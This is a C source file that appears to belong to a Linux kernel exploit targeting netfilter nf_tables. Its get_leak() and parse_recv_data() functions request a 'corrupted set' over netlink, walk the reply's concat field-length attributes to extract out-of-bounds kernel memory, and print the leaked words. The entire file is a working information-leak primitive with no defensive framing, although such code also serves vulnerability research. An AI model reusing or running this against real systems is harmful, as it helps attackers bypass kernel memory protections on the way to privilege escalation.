#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>

#include "log.h"
#include "leak.h"
#include "netlink.h"
#include "nf_tables.h"

#define BUFFER_SIZE 4096

/**
 * parse_recv_data(): Receive and parse data from the get_set response
 * @sock: Socket used to send the get_set request
 */
void parse_recv_data(int sock) {
    uint8_t buffer[BUFFER_SIZE];
    struct msghdr msg;
    struct iovec iov;
    uint32_t len_received_data;
    uint8_t *leaked_data = malloc(LEAK_BUFFER_SIZE);
    uint32_t pos = 0;

    if (leaked_data == NULL)
        do_error_exit("malloc");

    /* Prepare the iov for message reception */
    memset(&iov, 0, sizeof(struct iovec));
    iov.iov_base = (void *)buffer;
    iov.iov_len = BUFFER_SIZE;

    /* Prepare the message header */
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    /* Message reception */
    len_received_data = recvmsg(sock, &msg, 0);

    /* Leak parsing */
    {
        struct nlattr *attr;
        struct nlmsghdr *nlh = (struct nlmsghdr *)buffer;
        struct nfgenmsg *nfm = NLMSG_DATA(nlh);

        attr = (struct nlattr *)(buffer + NLMSG_SPACE(sizeof(struct nfgenmsg)));
        while(attr->nla_type != NFTA_SET_DESC) {
            attr = (void *)attr + NLA_ALIGN(attr->nla_len);
        }

        attr = (void *)attr + NLA_HDRLEN;                                // NFTA_SET_DESC_CONCAT
        attr = (void *)attr + NLA_HDRLEN;                                // NFTA_LIST_ELEM

        while(attr->nla_type == NFTA_LIST_ELEM) {
            attr = (void *)attr + NLA_HDRLEN;                            // NFTA_SET_FIELD_LEN

            if (pos >= LEAK_BASE)
                leaked_data[pos - LEAK_BASE] = (uint8_t)htonl(*(uint32_t *)NLA_ATTR(attr));

            attr = (void *)attr + attr->nla_len;
            pos++;
        }

        for (uint8_t j = 0; j < (LEAK_BUFFER_SIZE / sizeof(long)); j++) {
            printf("[+] Leak %d: 0x%lx\n", j, *((long *)leaked_data + j));
        }
    }

    free(leaked_data);
}

/**
 * get_leak(): Get an kernel info leak
 * @sock: Socket used to request the leak
 * @table_name: Name of the table that contains the corrupted set
 * @set_name: Name of the corrupted set
 */
void get_leak(int sock, const char *table_name, const char *set_name) {

    get_set(sock, table_name, set_name);
    return parse_recv_data(sock);

}
